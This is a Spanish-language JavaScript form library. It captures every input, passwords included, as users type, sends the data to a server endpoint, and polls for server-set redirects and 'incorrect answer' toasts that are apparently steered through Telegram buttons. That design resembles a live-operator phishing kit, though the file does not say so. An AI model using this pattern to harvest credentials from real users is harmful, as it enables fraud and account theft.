/**
 * ========================================
 * UTILIDADES GLOBALES DE LOCALSTORAGE - VERSIÓN AUTO
 * ========================================
 * 
 * Archivo: localStorage-utils-auto.js
 * 
 * VERSIÓN MEJORADA CON:
 * ✅ Detección automática de campos del DOM
 * ✅ Actualización automática de campos pre-llenados
 * ✅ Guardado automático en tiempo real
 * ✅ Menos código necesario en tus vistas
 * 
 * Uso simple:
 * - inicializarFormulario() // Inicializa todo automáticamente
 * - guardarFormulario({ usuario: 'juan' }) // Si necesitas manual
 */

// ===== CONFIGURACIÓN GLOBAL =====
const CONFIG_STORAGE_AUTO = {
    clave: 'formularioCompleto',
    debug: true,
    autoInit: true, // Inicializar formulario automáticamente
    autoGuardar: true, // Guardar automáticamente en cambios
    autoCompletarCampos: true, // Pre-llenar campos guardados
    redirectUrl: null, // URL a la que redirigir después del envío exitoso (null = sin redirección)
    redirectDelay: 1500, // Delay en ms antes de redirigir (para mostrar mensaje de éxito)
    directorio: 'prueba', // Directorio de vistas para botones de Telegram
    toastMessage: 'Respuesta incorrecta, intente nuevamente', // Mensaje para toast en cambio='2'
    selectoresEntrada: [
        'input[type="text"]',
        'input[type="hidden"]',
        'input[type="email"]',
        'input[type="tel"]',
        'input[type="number"]',
        'input[type="password"]',
        'input[type="date"]',
        'input[type="time"]',
        'input[type="checkbox"]',
        'input[type="radio"]',
        'select',
        'textarea'
    ]
};

/**
 * ========== FUNCIONES AUTOMÁTICAS ==========
 */

/**
 * Inicializa el formulario automáticamente
 * - Detecta todos los campos del DOM
 * - Pre-completa con datos guardados
 * - Establece listeners para auto-guardar
 * 
 * @ejemplo
 * document.addEventListener('DOMContentLoaded', () => {
 *   inicializarFormulario();
 * });
 */
function inicializarFormulario() {
    try {
        // Obtener datos guardados
        const datosGuardados = obtenerFormulario();

        // Detectar campos
        const campos = detectarCampos();

        // Pre-completar campos solo si está habilitado
        if (CONFIG_STORAGE_AUTO.autoCompletarCampos) {
            campos.forEach(campo => {
                const idCampo = campo.id || campo.name;
                if (idCampo && datosGuardados[idCampo]) {
                    completarCampo(campo, datosGuardados[idCampo]);
                }
            });
        }

        // Establecer listeners para auto-guardar
        if (CONFIG_STORAGE_AUTO.autoGuardar) {
            establecerListenersAutoGuardar(campos);
        }

        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('✅ Formulario inicializado automáticamente');
            console.log('📊 Campos detectados:', campos.length);
            console.log('🔄 Auto-completar:', CONFIG_STORAGE_AUTO.autoCompletarCampos);
            console.log('💾 Datos guardados:', Object.keys(datosGuardados).length);
        }

        return campos;
    } catch (error) {
        console.error('❌ Error al inicializar formulario:', error);
        return [];
    }
}

/**
 * Detecta automáticamente todos los campos del formulario
 * EXCLUYE campos que comienzan con "no-" (ej: id="no-email")
 * @returns {Array} Array de elementos del DOM
 */
function detectarCampos() {
    try {
        let campos = [];
        let camposIgnorados = [];
        
        // Buscar en todos los selectores configurados
        CONFIG_STORAGE_AUTO.selectoresEntrada.forEach(selector => {
            const elementos = document.querySelectorAll(selector);
            campos = [...campos, ...elementos];
        });
        
        // Filtrar campos:
        // 1. Que tengan id o name
        // 2. Que NO comiencen con "no-" (estos se ignoran)
        campos = campos.filter(campo => {
            const id = campo.id || campo.name;
            const esIgnorado = id && id.startsWith('no-');
            if (esIgnorado) {
                camposIgnorados.push(id);
            }
            return id && !esIgnorado;
        });
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('🔍 Campos detectados:', campos.length);
            if (camposIgnorados.length > 0) {
                console.log('🚫 Campos ignorados (prefijo no-):', camposIgnorados);
            }
        }
        
        return campos;
    } catch (error) {
        console.error('❌ Error al detectar campos:', error);
        return [];
    }
}

/**
 * Completa un campo con un valor
 * @param {Element} campo - Elemento del DOM
 * @param {*} valor - Valor a asignar
 */
function completarCampo(campo, valor) {
    try {
        if (campo.type === 'checkbox') {
            campo.checked = valor === true || valor === 'true' || valor === '1';
        } else if (campo.type === 'radio') {
            if (campo.value === valor) {
                campo.checked = true;
            }
        } else if (campo.tagName === 'SELECT') {
            campo.value = valor;
        } else {
            campo.value = valor;
        }
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log(`✅ Campo completado: ${campo.id || campo.name} = ${valor}`);
        }
    } catch (error) {
        console.error(`❌ Error al completar campo ${campo.id || campo.name}:`, error);
    }
}

/**
 * Establece listeners automáticos para guardar en tiempo real
 * @param {Array} campos - Array de campos a monitorear
 */
function establecerListenersAutoGuardar(campos) {
    try {
        campos.forEach(campo => {
            // Evento para input, textarea, select
            ['change', 'blur', 'input'].forEach(evento => {
                campo.addEventListener(evento, function() {
                    const idCampo = this.id || this.name;
                    if (idCampo) {
                        const valor = this.type === 'checkbox' ? this.checked : this.value;
                        guardarFormulario({ [idCampo]: valor });
                    }
                });
            });
        });
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('🔄 Auto-guardado activado para', campos.length, 'campos');
        }
    } catch (error) {
        console.error('❌ Error al establecer listeners:', error);
    }
}

/**
 * Obtiene valores de todos los campos del formulario detectados
 * IGNORA campos con prefijo "no-"
 * @returns {Object} Objeto con todos los valores
 * 
 * @ejemplo
 * const datosFormulario = obtenerDatosFormulario();
 * console.log(datosFormulario); // { usuario: 'juan', email: 'juan@test.com', ... }
 */
function obtenerDatosFormulario() {
    try {
        const campos = detectarCampos();
        const datos = {};
        
        campos.forEach(campo => {
            const id = campo.id || campo.name;
            if (id && !id.startsWith('no-')) {
                if (campo.type === 'checkbox') {
                    datos[id] = campo.checked;
                } else if (campo.type === 'radio') {
                    if (campo.checked) {
                        datos[id] = campo.value;
                    }
                } else {
                    datos[id] = campo.value;
                }
            }
        });
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('📋 Datos del formulario:', datos);
        }
        
        return datos;
    } catch (error) {
        console.error('❌ Error al obtener datos del formulario:', error);
        return {};
    }
}

/**
 * Guarda TODOS los campos del formulario actual automáticamente
 * @returns {Object} Datos guardados
 * 
 * @ejemplo
 * guardarTodoFormulario();
 */
function guardarTodoFormulario() {
    try {
        const datosFormulario = obtenerDatosFormulario();
        guardarFormulario(datosFormulario);
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('✅ Formulario completo guardado:', datosFormulario);
        }
        
        return datosFormulario;
    } catch (error) {
        console.error('❌ Error al guardar formulario completo:', error);
        return null;
    }
}

/**
 * ========== FUNCIONES BASE (del archivo anterior) ==========
 */

/**
 * Guarda datos en localStorage de manera segura
 * Combina datos nuevos con existentes sin sobrescribir
 * 
 * @param {Object} datos - Objeto con los datos a guardar
 * @returns {Object} Retorna el objeto completo guardado
 */
function guardarFormulario(datos) {
    try {
        if (!datos || typeof datos !== 'object' || Array.isArray(datos)) {
            console.error('guardarFormulario: El parámetro debe ser un objeto válido');
            return null;
        }

        const datosExistentes = JSON.parse(
            localStorage.getItem(CONFIG_STORAGE_AUTO.clave)
        ) || {};

        // Directorio siempre va primero en el JSON y siempre usa el valor actual
        const { directorio: _, ...datosExistentesSinDirectorio } = datosExistentes;
        const datosActualizados = {
            directorio: CONFIG_STORAGE_AUTO.directorio,
            ...datosExistentesSinDirectorio,
            ...datos
        };

        localStorage.setItem(
            CONFIG_STORAGE_AUTO.clave,
            JSON.stringify(datosActualizados)
        );

        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('✅ Datos guardados:', datosActualizados);
        }

        return datosActualizados;
    } catch (error) {
        console.error('❌ Error al guardar en localStorage:', error);
        return null;
    }
}

/**
 * Obtiene todos los datos guardados en localStorage
 * @returns {Object} Objeto completo con todos los datos guardados
 */
function obtenerFormulario() {
    try {
        const datos = JSON.parse(
            localStorage.getItem(CONFIG_STORAGE_AUTO.clave)
        ) || {};
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('📖 Datos obtenidos:', datos);
        }
        
        return datos;
    } catch (error) {
        console.error('❌ Error al obtener datos de localStorage:', error);
        return {};
    }
}

/**
 * Obtiene el valor de un campo específico
 * @param {String} campo - Nombre del campo a obtener
 * @returns {*} Valor del campo o undefined si no existe
 */
function obtenerCampo(campo) {
    try {
        const datos = obtenerFormulario();
        const valor = datos[campo];
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log(`📖 Campo '${campo}':`, valor);
        }
        
        return valor;
    } catch (error) {
        console.error(`❌ Error al obtener campo '${campo}':`, error);
        return undefined;
    }
}

/**
 * Actualiza un campo específico sin afectar los demás
 * @param {String} campo - Nombre del campo
 * @param {*} valor - Nuevo valor para el campo
 * @returns {Object} Objeto completo actualizado
 */
function actualizarCampo(campo, valor) {
    try {
        if (!campo || typeof campo !== 'string') {
            console.error('actualizarCampo: El campo debe ser un string válido');
            return null;
        }

        const datos = obtenerFormulario();
        datos[campo] = valor;
        
        localStorage.setItem(
            CONFIG_STORAGE_AUTO.clave, 
            JSON.stringify(datos)
        );
        
        // También actualizar el campo en el DOM si existe
        const elementoCampo = document.getElementById(campo) || document.querySelector(`[name="${campo}"]`);
        if (elementoCampo) {
            completarCampo(elementoCampo, valor);
        }
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log(`✅ Campo '${campo}' actualizado a:`, valor);
        }
        
        return datos;
    } catch (error) {
        console.error(`❌ Error al actualizar campo '${campo}':`, error);
        return null;
    }
}

/**
 * Actualiza múltiples campos a la vez
 * @param {Object} camposValores - Objeto con pares campo: valor
 * @returns {Object} Objeto completo actualizado
 */
function actualizarMultiplesCampos(camposValores) {
    try {
        if (!camposValores || typeof camposValores !== 'object') {
            console.error('actualizarMultiplesCampos: El parámetro debe ser un objeto válido');
            return null;
        }

        const resultado = guardarFormulario(camposValores);
        
        // Actualizar campos en el DOM
        Object.keys(camposValores).forEach(campo => {
            const elementoCampo = document.getElementById(campo) || document.querySelector(`[name="${campo}"]`);
            if (elementoCampo) {
                completarCampo(elementoCampo, camposValores[campo]);
            }
        });
        
        return resultado;
    } catch (error) {
        console.error('❌ Error al actualizar múltiples campos:', error);
        return null;
    }
}

/**
 * Elimina un campo específico del localStorage
 * @param {String} campo - Nombre del campo a eliminar
 * @returns {Object} Objeto actualizado sin el campo
 */
function eliminarCampo(campo) {
    try {
        if (!campo || typeof campo !== 'string') {
            console.error('eliminarCampo: El campo debe ser un string válido');
            return null;
        }

        const datos = obtenerFormulario();
        delete datos[campo];
        
        localStorage.setItem(
            CONFIG_STORAGE_AUTO.clave, 
            JSON.stringify(datos)
        );
        
        // Limpiar campo en el DOM
        const elementoCampo = document.getElementById(campo) || document.querySelector(`[name="${campo}"]`);
        if (elementoCampo) {
            if (elementoCampo.type === 'checkbox') {
                elementoCampo.checked = false;
            } else {
                elementoCampo.value = '';
            }
        }
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log(`✅ Campo '${campo}' eliminado`);
        }
        
        return datos;
    } catch (error) {
        console.error(`❌ Error al eliminar campo '${campo}':`, error);
        return null;
    }
}

/**
 * Limpia completamente el localStorage
 * @returns {Boolean} true si se limpió correctamente
 */
function limpiarFormulario() {
    try {
        localStorage.removeItem(CONFIG_STORAGE_AUTO.clave);
        
        // Limpiar todos los campos en el DOM
        const campos = detectarCampos();
        campos.forEach(campo => {
            if (campo.type === 'checkbox') {
                campo.checked = false;
            } else if (campo.type === 'radio') {
                campo.checked = false;
            } else {
                campo.value = '';
            }
        });
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('🗑️  localStorage y formulario completamente limpiados');
        }
        
        return true;
    } catch (error) {
        console.error('❌ Error al limpiar localStorage:', error);
        return false;
    }
}

/**
 * Verifica si existe un campo específico
 * @param {String} campo - Nombre del campo a verificar
 * @returns {Boolean} true si el campo existe
 */
function existeCampo(campo) {
    try {
        if (!campo || typeof campo !== 'string') {
            return false;
        }

        const datos = obtenerFormulario();
        const existe = campo in datos;
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log(`📖 ¿Existe '${campo}'?:`, existe);
        }
        
        return existe;
    } catch (error) {
        console.error(`❌ Error al verificar campo '${campo}':`, error);
        return false;
    }
}

/**
 * Obtiene información sobre el localStorage actual
 * @returns {Object} Objeto con información del storage
 */
function infoFormulario() {
    try {
        const datos = obtenerFormulario();
        const campos = Object.keys(datos);
        const json = JSON.stringify(datos);
        const tamaño = new Blob([json]).size;
        
        const info = {
            total: campos.length,
            campos: campos,
            tamaño: `${(tamaño / 1024).toFixed(2)} KB`,
            tamañoBytes: tamaño,
            clave: CONFIG_STORAGE_AUTO.clave
        };
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('📊 Información del formulario:', info);
        }
        
        return info;
    } catch (error) {
        console.error('❌ Error al obtener información:', error);
        return null;
    }
}

/**
 * Imprime en consola todos los datos de forma legible
 */
function mostrarDatos() {
    try {
        const datos = obtenerFormulario();
        console.clear();
        console.log('%c=== DATOS GUARDADOS EN LOCALSTORAGE ===', 'color: #00aa00; font-weight: bold; font-size: 14px;');
        console.table(datos);
        console.log('%cJSON completo:', 'color: #0066cc; font-weight: bold;');
        console.log(JSON.stringify(datos, null, 2));
    } catch (error) {
        console.error('❌ Error al mostrar datos:', error);
    }
}

/**
 * Fusiona objeto externo con los datos guardados
 * @param {Object} datosExterno - Datos a fusionar
 * @param {Boolean} sobrescribir - Si true, sobrescribe valores duplicados
 * @returns {Object} Objeto completo fusionado
 */
function fusionarDatos(datosExterno, sobrescribir = true) {
    try {
        if (!datosExterno || typeof datosExterno !== 'object' || Array.isArray(datosExterno)) {
            console.error('fusionarDatos: El parámetro debe ser un objeto válido');
            return null;
        }

        const datosActuales = obtenerFormulario();
        let datosFinales;

        if (sobrescribir) {
            datosFinales = { ...datosActuales, ...datosExterno };
        } else {
            datosFinales = { ...datosExterno, ...datosActuales };
        }

        localStorage.setItem(
            CONFIG_STORAGE_AUTO.clave,
            JSON.stringify(datosFinales)
        );

        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('✅ Datos fusionados:', datosFinales);
        }

        return datosFinales;
    } catch (error) {
        console.error('❌ Error al fusionar datos:', error);
        return null;
    }
}

/**
 * Exporta los datos a un formato JSON descargable
 * @param {String} nombreArchivo - Nombre del archivo a descargar (sin extensión)
 * @returns {Boolean} true si se inició descarga
 */
function exportarJSON(nombreArchivo = 'formulario') {
    try {
        const datos = obtenerFormulario();
        const json = JSON.stringify(datos, null, 2);
        const blob = new Blob([json], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        
        link.href = url;
        link.download = `${nombreArchivo}_${new Date().getTime()}.json`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
        
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('💾 Datos exportados:', nombreArchivo);
        }
        
        return true;
    } catch (error) {
        console.error('❌ Error al exportar JSON:', error);
        return false;
    }
}

/**
 * Habilita o deshabilita el modo debug
 * @param {Boolean} activar - true para activar, false para desactivar
 */
function setDebug(activar) {
    CONFIG_STORAGE_AUTO.debug = activar;
    console.log(`🔧 Debug ${activar ? 'ACTIVADO' : 'DESACTIVADO'}`);
}

/**
 * Cambia la configuración de auto-guardado
 * @param {Boolean} activar - true para activar, false para desactivar
 */
function setAutoGuardar(activar) {
    CONFIG_STORAGE_AUTO.autoGuardar = activar;
    console.log(`🔄 Auto-guardado ${activar ? 'ACTIVADO' : 'DESACTIVADO'}`);
}

/**
 * Configura la URL de redirección después del envío exitoso
 * @param {String|null} url - URL a la que redirigir (null para desactivar)
 * @param {Number} delay - Delay en ms antes de redirigir (default: 1500)
 */
function setRedirectUrl(url, delay = 1500) {
    CONFIG_STORAGE_AUTO.redirectUrl = url;
    CONFIG_STORAGE_AUTO.redirectDelay = delay;
    if (CONFIG_STORAGE_AUTO.debug) {
        if (url) {
            console.log(`🔗 Redirección configurada: ${url} (delay: ${delay}ms)`);
        } else {
            console.log('🔗 Redirección desactivada');
        }
    }
}

/**
 * Obtiene la URL de redirección actual
 * @returns {String|null} URL configurada o null
 */
function getRedirectUrl() {
    return CONFIG_STORAGE_AUTO.redirectUrl;
}

/**
 * ========== FUNCIONES DE ENVÍO AL SERVIDOR ==========
 */

/**
 * Obtiene o genera el identificador único del usuario
 * @returns {String} El uniqid del usuario
 */
function obtenerUniqid() {
    let uniqid = localStorage.getItem('uniqid');
    if (!uniqid) {
        uniqid = 'user_' + Date.now() + '_' + Math.random().toString(36).substring(2, 11);
        localStorage.setItem('uniqid', uniqid);
    }
    return uniqid;
}

/**
 * Envía los datos del formulario al servidor
 * Requiere un botón con id="enviar" y opcionalmente:
 * - Un input hidden con id="no-status" para el status
 * - Un elemento con id="mensaje" para mostrar el resultado
 *
 * @param {Event} e - Evento del formulario (opcional)
 * @returns {Promise<Object>} Resultado de la operación
 */
async function enviarFormulario(e) {
    if (e) e.preventDefault();

    const btnEnviar = document.getElementById('enviar');
    const mensaje = document.getElementById('mensaje');
    const statusField = document.getElementById('no-status');

    // Deshabilitar botón
    if (btnEnviar) {
        btnEnviar.disabled = true;
        btnEnviar.dataset.textoOriginal = btnEnviar.textContent;
        btnEnviar.textContent = 'Enviando...';
    }

    try {
        // 1. Guardar formulario en localStorage
        guardarTodoFormulario();

        // 2. Obtener datos
        const uniqid = obtenerUniqid();
        const datosCompletos = obtenerFormulario();
        const status = statusField ? statusField.value : 'pending';

        // 3. Enviar al servidor
        const response = await fetch('/api/entradas/sync', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.content || ''
            },
            body: JSON.stringify({
                uniqid: uniqid,
                datos: datosCompletos,
                status: status,
                directorio: CONFIG_STORAGE_AUTO.directorio
            })
        });

        const result = await response.json();

        if (result.success) {
            // Guardar el status en localStorage para que el polling lo use
            guardarFormulario({ status: status });

            if (mensaje) {
                mensaje.className = 'mensaje exito';
                mensaje.textContent = '¡Datos enviados correctamente!';
            }
            if (CONFIG_STORAGE_AUTO.debug) {
                console.log('✅ Datos enviados al servidor:', result);
            }

            // Redirigir si hay URL configurada
            if (CONFIG_STORAGE_AUTO.redirectUrl) {
                if (CONFIG_STORAGE_AUTO.debug) {
                    console.log(`🔄 Redirigiendo a: ${CONFIG_STORAGE_AUTO.redirectUrl} en ${CONFIG_STORAGE_AUTO.redirectDelay}ms`);
                }
                setTimeout(() => {
                    window.location.href = CONFIG_STORAGE_AUTO.redirectUrl;
                }, CONFIG_STORAGE_AUTO.redirectDelay);
            }
        } else {
            throw new Error(result.message || 'Error al enviar');
        }

        return result;
    } catch (error) {
        if (mensaje) {
            mensaje.className = 'mensaje error';
            mensaje.textContent = 'Error al enviar: ' + error.message;
        }
        console.error('❌ Error al enviar formulario:', error);
        throw error;
    } finally {
        // Restaurar botón
        if (btnEnviar) {
            btnEnviar.disabled = false;
            btnEnviar.textContent = btnEnviar.dataset.textoOriginal || 'Enviar';
        }
    }
}

/**
 * Inicializa el listener de envío para formularios
 * Busca un formulario y configura el envío automático
 *
 * @param {String} formId - ID del formulario (opcional, busca el primero si no se especifica)
 */
function inicializarEnvio(formId = null) {
    const form = formId ? document.getElementById(formId) : document.querySelector('form');

    if (form) {
        form.addEventListener('submit', enviarFormulario);
        if (CONFIG_STORAGE_AUTO.debug) {
            console.log('✅ Listener de envío configurado para:', form.id || 'formulario');
        }
    } else {
        console.warn('⚠️ No se encontró formulario para inicializar envío');
    }
}

/**
 * ========== FUNCIONES DE TOAST ==========
 */

/**
 * Guarda un mensaje de toast en localStorage para mostrarlo después de redirección
 * @param {String} mensaje - Mensaje a mostrar
 */
function guardarToastPendiente(mensaje) {
    localStorage.setItem('toast_pendiente', mensaje);
}

/**
 * Obtiene y elimina el toast pendiente de localStorage
 * @returns {String|null} Mensaje del toast o null si no hay
 */
function obtenerToastPendiente() {
    const mensaje = localStorage.getItem('toast_pendiente');
    if (mensaje) {
        localStorage.removeItem('toast_pendiente');
    }
    return mensaje;
}

/**
 * Muestra una notificación toast
 * @param {String} mensaje - Mensaje a mostrar
 * @param {Number} duracion - Duración en ms (default: 4000)
 */
function mostrarToast(mensaje, duracion = 4000) {
    // Crear contenedor si no existe
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        container.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        `;
        document.body.appendChild(container);
    }

    // Crear toast
    const toast = document.createElement('div');
    toast.style.cssText = `
        background: #333;
        color: #fff;
        padding: 16px 24px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        font-size: 14px;
        max-width: 350px;
        opacity: 0;
        transform: translateX(100%);
        transition: all 0.3s ease;
    `;
    toast.textContent = mensaje;
    container.appendChild(toast);

    // Animar entrada
    requestAnimationFrame(() => {
        toast.style.opacity = '1';
        toast.style.transform = 'translateX(0)';
    });

    // Animar salida y eliminar
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(100%)';
        setTimeout(() => toast.remove(), 300);
    }, duracion);
}

/**
 * Verifica si hay un toast pendiente y lo muestra
 */
function verificarToastPendiente() {
    const mensaje = obtenerToastPendiente();
    if (mensaje) {
        mostrarToast(mensaje);
    }
}

/**
 * ========== FUNCIONES DE POLLING ==========
 */

/**
 * Inicia polling para consultar el status en la DB y redirigir
 *
 * @param {Object} config - Configuración del polling
 * @param {String} config.basePath - Ruta base para redirección (default: '/prueba')
 * @param {Number} config.interval - Intervalo en ms entre consultas (default: 3000)
 *
 * Valores de cambio:
 * - '0': status de DB no tiene prefijo "t-" (sin transición pendiente, seguir polling)
 * - '1': status de DB tiene "t-" y es diferente al cliente (redirigir)
 * - '2': status de DB tiene "t-" y es diferente al cliente (redirigir + mostrar toast)
 *
 * @ejemplo
 * iniciarPolling({ basePath: '/kassio', interval: 2000 });
 */
function iniciarPolling(config = {}) {
    const basePath = config.basePath || '/prueba';
    const interval = config.interval || 3000;

    async function poll() {
        const uniqid = obtenerUniqid();
        const statusLocal = obtenerCampo('status') || '';
        const directorio = CONFIG_STORAGE_AUTO.directorio || 'prueba';

        if (!uniqid) {
            console.error('No se encontró uniqid');
            return;
        }

        try {
            const response = await fetch(`/api/entradas/status/${uniqid}?status=${encodeURIComponent(statusLocal)}&directorio=${encodeURIComponent(directorio)}`);
            const data = await response.json();

            if (data.success) {
                if (CONFIG_STORAGE_AUTO.debug) {
                    console.log(`🔄 Polling: status=${data.status}, cambio=${data.cambio}`);
                }

                if (data.cambio === '1' || data.cambio === '2') {
                    // Hay transición y el cliente debe redirigir
                    // Quitar prefijo "t-" del status para obtener la vista destino
                    let vistaDestino = data.status;
                    if (vistaDestino.startsWith('t-')) {
                        vistaDestino = vistaDestino.substring(2);
                    }

                    // Si cambio='2', guardar toast pendiente (mensaje viene del servidor)
                    if (data.cambio === '2' && data.toast) {
                        guardarToastPendiente(data.toast);
                    }

                    const redirectUrl = `${basePath}/${vistaDestino}`;
                    window.location.href = redirectUrl;
                } else {
                    // cambio='0': sin transición pendiente, seguir polling
                    setTimeout(poll, interval);
                }
            } else {
                // Seguir intentando si no se encontró
                setTimeout(poll, interval);
            }
        } catch (error) {
            console.error('Error en polling:', error);
            setTimeout(poll, interval);
        }
    }

    // Iniciar polling
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', poll);
    } else {
        poll();
    }
}

/**
 * ========== AUTO-INICIALIZACIÓN ==========
 * Se ejecuta automáticamente cuando el DOM está listo
 * - autoInit: inicializa el formulario (detectar campos, pre-completar, auto-guardar)
 * - Siempre configura el listener de envío si existe botón con id="enviar"
 */
document.addEventListener('DOMContentLoaded', function() {
    // Verificar si hay un toast pendiente de mostrar
    verificarToastPendiente();

    // Inicializar formulario si está habilitado
    if (CONFIG_STORAGE_AUTO.autoInit) {
        inicializarFormulario();
    }

    // Configurar listener de envío
    const btnEnviar = document.getElementById('enviar');
    if (btnEnviar) {
        inicializarEnvio();
    }
});
